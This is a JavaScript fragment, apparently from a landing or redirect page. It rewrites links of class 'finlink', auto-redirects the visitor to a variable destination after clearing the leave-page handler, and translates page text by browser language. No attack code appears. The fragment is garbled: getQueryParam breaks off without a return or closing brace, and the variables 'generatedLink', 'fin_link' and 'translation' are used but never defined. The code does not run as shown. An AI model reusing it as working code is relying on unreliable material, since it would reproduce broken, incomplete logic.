      function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);

      // version parametresini al
      let version = getQueryParam("version") || "v1";

      document.querySelectorAll(".finlink").forEach((link) => {
        link.href = generatedLink;
      });

      var links = document.getElementsByClassName("finlink");
      for (var i = 0; i < links.length; i++)
        links[i].setAttribute("href", generatedLink);

      for (var j = 0; j < links.length; j++) {
        links[j].addEventListener("click", function () {
          window.onbeforeunload = null;
        });
      }

      //Autoredirect

        window.onbeforeunload = null;
        window.location.href = fin_link;

      function replace_text(lang) {
        var elements = document.getElementsByClassName("translatable");
        for (var i = 0; i < elements.length; i++) {
          var text = elements[i].getAttribute("data-translate");
          var translatedText = translation[lang][text];
          if (translatedText) {
            elements[i].innerHTML = translatedText;
          } else {
            console.log("Translation not found for: " + text);
          }
        }
      }

      function translation_available(lang) {
        if (translation[lang]) {
          return lang;
        } else {
          console.log("Translation not found for language: " + lang);
          return "source";
        }
      }

      function detect_language() {
        var language =
          (navigator.languages && navigator.languages[0]) ||
          navigator.language ||
          navigator.userLanguage;
        if (language.length > 3) {
          language = language[0] + language[1];
        }
        if (["ar", "he", "fa", "ur"].indexOf(language) >= 0) {
          document.documentElement.setAttribute("dir", "rtl");
        }
        return translation_available(language);
      }

      function translate() {
        var language = detect_language();
        replace_text(language);
      }

      // Call the translate function when the page is ready
      document.addEventListener("DOMContentLoaded", function () {
        translate();
